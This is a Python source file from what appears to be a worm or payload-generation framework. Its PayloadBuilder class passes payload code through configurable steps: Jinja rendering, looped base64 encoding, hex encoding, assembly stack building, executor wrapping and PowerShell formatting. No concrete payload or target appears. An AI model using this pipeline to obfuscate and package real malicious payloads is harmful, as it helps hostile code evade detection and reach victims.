import os
from jinja2 import Template
from typing import Union, Tuple

from .payload_tools.pay_encoder import PayEncoder
from .payload_tools.pay_tools import PayloadTools

class PayloadObject:
    def __init__(self, payload_mod: object, var_name_payload: str, var: dict, worm_step_payload: list = [], global_opt: dict = {}):
        self.module = payload_mod
        self.var_name = var_name_payload
        self.var = var
        self.gvar = global_opt
        self.worm_opt = self.module.options
        self.worm_step = worm_step_payload
        self.in_opt = self.module.payOpt.copy()
        self.pay_opt = self.get_payload_in_var()
        self.in_opt.update(self.pay_opt)
        if not self.module.lang or self.module.lang == "python":
            self._raw_code, self._imports = self.read_code()
        else:
            self._raw_code = self.module.raw_code
            self._imports = []
        self._code = None
        self._raw_bin = None
    
    @property
    def raw_code(self) -> str:
        if self.module.import_FLAG or self.worm_opt.get("INCLUDE_IMPORTS"):
            return "\n".join(self._imports) + "\n" + str(self._raw_code)
        else:
            return str(self._raw_code)
    
    @property
    def imports(self) -> list:
        if self.module.import_FLAG:
            return []
        else:
            return self._imports
    
    @property
    def code(self) -> str:
        if self._code:
            return str(self._code).rstrip("\n")
        else:
            return self.raw_code.rstrip("\n")
    
    def get_payload_in_var(self) -> dict:
        po = {}
        for k, i in self.var.items():
            if k[0] == "_" and k[1] != "_":
                po[k[1:]] = i
        return po
    
    def get_payload_out_var(self) -> dict:
        out = {}
        for k, i in self.var.items():
            if k.startswith("__"):
                out[k[2:]] = i
        return out
    
    def read_code(self) -> Tuple[str, list]:
        code = ""
        imp = []
        for line in self.module.raw_code.split("\n"):
            if line.startswith("import") or line.startswith("from"):
                imp.append(line.strip("\n"))
            else:
                code += line + "\n"
        return (code, imp)
    


class PayloadBuilder:
    def __init__(self, queen: object, coder: object):
        self.name = "PayloadBuilder"
        self.queen = queen
        self.coder = coder
        self.msg = self.queen.msg
        self.default_encode = self.queen.conf.payload_default_encode
        self.PE = PayEncoder(self)
        self.PT = PayloadTools(self)

    
    def prepare(self, mod: object, var_payload_name: str, var: dict, worm_step_payload: list = [], global_opt: dict = {}) -> object:
        pay_obj = PayloadObject(mod, var_payload_name, var, worm_step_payload, global_opt)
        self.msg("msg", f"Prepare Payload: '{mod.name}'")
        return pay_obj
    
    def prepare_step(self, pay_obj: object) -> list:
        steps_name = []
        for in_step in pay_obj.module.payStep:
            steps_name.append(in_step)
        out = []
        for tar_step in pay_obj.worm_step:
            if "$" in tar_step:
                step, tar = tar_step.split("$")
                if tar == pay_obj.var_name:
                    steps_name.append(step)
            else:
                out.append(tar_step)
        steps_name.append("change_flag")
        steps_name.extend(out)
        if not "render" in steps_name and pay_obj.module.render_FLAG:
            steps_name.insert(0, "render")
        steps = []
        for s in steps_name:
            steps.append(self.add_step(s))
        return steps
    
    def _add_var(self, pay_obj: object, pay_obj_var_name: str, value: str) -> Tuple[str, str]:
        var_name = pay_obj_var_name[8:]
        if value[0] == "$":
            return (var_name, value[1:])
        match var_name:
            case "bin_len":
                bl = self.get_bin_data(pay_obj)
                return (value, len(bl))
            case "code_len":
                return (value, len(pay_obj.code))
            case _:
                return (var_name, value)
        
         
    def step_empty(self, pay_obj: object) -> object:
        return pay_obj
    
    def step_render(self, pay_obj: object) -> object:
        if pay_obj.module.render_FLAG:
            try:
                code = Template(pay_obj.code)
                code = code.render(pay_obj.var)
                pay_obj._code = code
            except Exception as e:
                pass
        return pay_obj
    
    def step_encode_b64(self, pay_obj: object) -> object:
        add_lanuch = pay_obj.in_opt.get("encode_b64_exe")
        pay_obj._code = self.PE.encode_b64(pay_obj.code, add_lanuch)
        return pay_obj
    
    def step_encode_bin_b64(self, pay_obj: object) -> object:
        add_lanuch = pay_obj.in_opt.get("encode_b64_exe")
        pay_obj._code = self.PE.encode_b64(pay_obj._code, add_lanuch)
        return pay_obj
    
    
    def step_encode_b64_loop(self, pay_obj: object) -> object:
        count = pay_obj.in_opt.get("encode_b64_loop_count")
        if count:
            count = int(count)
        pay_obj._code = self.PE.encode_b64_loop(pay_obj.code, count)
        return pay_obj
    
    def step_change_flag(self, pay_obj: object) -> object:
        pay_obj.in_opt = pay_obj.worm_opt.copy()
        pay_obj.in_opt.update(pay_obj.get_payload_out_var())
        return pay_obj
    
    def step_load_binary(self, pay_obj: object) -> object:
        raw = pay_obj.module.load_bin()
        pay_obj._code = raw
        pay_obj._raw_bin = raw
        return pay_obj
    
    def get_bin_data(self, pay_obj: object) -> bytes:
        if pay_obj._raw_bin:
            return pay_obj._raw_bin
        else:
            if isinstance(pay_obj._code, bytes):
                return pay_obj._code
            else:
                self.msg("error", f"Raw binary data error in module '{pay_obj.module.name}': No binary data. Using 'str' data for conversion, errors may occur !!!", sender=self.name)
                return pay_obj.code.encode(self.default_encode)

    
    def step_asm_stack_build(self, pay_obj: object) -> object:
        bytes_num = pay_obj.in_opt.get("asm_stack_build_bytes", 4)
        cmd = pay_obj.in_opt.get("asm_stack_build_cmd")
        pay_obj._code = self.PE.asm_stack_builder(pay_obj.code, bytes_num, cmd)
        return pay_obj
    
    def step_encode_hex(self, pay_obj: object) -> object:
        encode_format = pay_obj.in_opt.get("encode_hex_format")
        pay_obj._code = self.PE.encode_hex(pay_obj.code, encode_format)
        return pay_obj
    
    def step_encode_bin_hex(self, pay_obj: object) -> object:
        bdata = self.get_bin_data(pay_obj)
        pay_obj._code = self.PE.encode_bin_hex(bdata)
        return pay_obj
    
    def step_add_executor(self, pay_obj: object) -> object:
        exe = pay_obj.in_opt.get("add_executor_exe", "")
        pay_obj._code = self.PT.add_executor(pay_obj.code, exe)
        return pay_obj
    
    def step_format_ps_script(self, pay_obj: object) -> object:
        pay_obj._code = self.PT.format_powershell(pay_obj.code)
        return pay_obj
    

    #### Add and set variables 
    #### SHEME:
    ####    #!payStep##add_var
    ####    #!payOpt##add_var_[var_name]##$[value]
    ####ex  #!payOpt##add_var_path##$c:/windows
    ###################################################
    ####    #!payOpt##add_var_[func_name]##[return_value]
    ####ex  #!payOpt##add_var_code_len##my_code_len     - set to 'my_code_len' payload length
    def step_add_var(self, pay_obj: object) -> object:
        var = {}
        for k,i in pay_obj.in_opt.items():
            if k.startswith("add_var_"):
                nvar = self._add_var(pay_obj, k, i)
                var[nvar[0]] = nvar[1]
        pay_obj.var.update(var)
        return pay_obj

    
    def add_step(self, name: str) -> object:
        match name:
            case "render":
                return self.step_render
            case "encode_b64":
                return self.step_encode_b64
            case "encode_bin64":
                return self.step_encode_bin_b64
            case "encode_b64_loop":
                return self.step_encode_b64_loop
            case "change_flag":
                return self.step_change_flag
            case "load_binary":
                return self.step_load_binary
            case "asm_stack_build":
                return self.step_asm_stack_build
            case "encode_hex":
                return self.step_encode_hex
            case "encode_bin_hex":
                return self.step_encode_bin_hex
            case "add_executor":
                return self.step_add_executor
            case "add_var":
                return self.step_add_var
            case "format_ps":
                return self.step_format_ps_script
            case _:
                self.msg("error", f"[!!] ERROR: Unknown Payload Process: '{name}' [!!]", sender=self.name)
                return self.step_empty
    
    def process(self, mod: object, var_payload_name: str, var: dict, worm_step_payload: list = [], global_opt: dict = {}) -> str:
        pay_obj = self.prepare(mod, var_payload_name, var, worm_step_payload, global_opt)
        steps = self.prepare_step(pay_obj)
        for step in steps:
            self.msg("dev", f"Payload Step: '{step.__name__}'", sender=self.name)
            pay_obj = step(pay_obj)
        return pay_obj.code

        
